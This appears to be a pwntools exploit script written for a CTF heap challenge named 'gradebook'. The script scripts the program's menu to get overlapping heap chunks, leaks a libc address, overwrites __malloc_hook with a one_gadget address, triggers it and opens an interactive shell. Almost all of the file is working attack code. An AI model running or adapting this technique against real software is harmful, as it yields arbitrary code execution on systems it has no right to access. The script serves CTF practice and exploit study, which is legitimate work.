#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('gradebook')
pwn.context(terminal=['tmux', 'new-window'])

pwn.context.log_level = 'DEBUG'
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)

libc = pwn.ELF("./libc.so.6")

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
b *0x555555555978
b *0x555555555604
b *0x55555555598f
b *0x55555555574a
b *0x555555555720
commands
    x/100gx 0x000055555555b840-16
end
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def GetOffsetStdin():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process(exe.path)
    p.sendline(pwn.cyclic(512))
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def GetOffsetArgv():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process([exe.path, cyclic(512)])
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def addStudent(id, size, name):
    io.recvuntil(">")
    io.sendline("1")
    io.recvuntil(":")
    io.sendline(id)
    io.recvuntil(":")
    io.sendline(size)
    io.recvuntil(":")
    io.sendline(name)

def clear():
    io.recvuntil(">")
    io.sendline("5")

def list_stus_ok():
    io.recvuntil(">")
    io.sendline("2")


def update_grade(student_id, grade):
    io.recvuntil(">")
    io.sendline("3")
    io.recvuntil(":")
    io.sendline(student_id)
    io.recvuntil(":")
    io.sendline(grade)

def update_name(student_id, name):
    io.recvuntil(">")
    io.sendline("4")
    io.recvuntil(":")
    io.sendline(student_id)
    io.recvuntil(":")
    io.sendline(name)

addStudent("12341", "200", "name7")
addStudent("12342", "200", "name7")
addStudent("12343", "200", "name7")
addStudent("12344", "200", "name7")
addStudent("12345", "200", "name7")
addStudent("12346", "200", "name7")
addStudent("12347", "200", "name7")
addStudent("12348", "200", "name7")
addStudent("12349", "200", "name7")

clear()

addStudent("1234", "200", "namenam1")
addStudent("1235", "200", "namenam2")
addStudent("1236", "200", "namenam3")
addStudent("1237", "200", "namenam4")
addStudent("1238", "200", "namenam5")
addStudent("1239", "200", "namenam6")
addStudent("1231", "200", "namenam7")
addStudent("1232", "200", "namenam8")


list_stus_ok()

io.recvuntil("namenam8")

leak = io.recv(6)

leak = leak + b'\x00\x00'

print("leak :: " +  hex(pwn.u64(leak)))

libc_addr = pwn.u64(leak) - 2014218

print("libc_addr :: " +  hex(libc_addr))

libc.address = libc_addr


update_grade("1234", "9223372036854775807")
update_name("1234", b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaae1232\x00aae" + pwn.p64(0x00d200d200d200d2) + pwn.p64(libc.sym.__malloc_hook) + pwn.p64(0x00000000000000d2))
update_name("1232", pwn.p64(libc.address + 0xe6c81))

io.recvuntil(">")
io.sendline("1")

io.interactive()


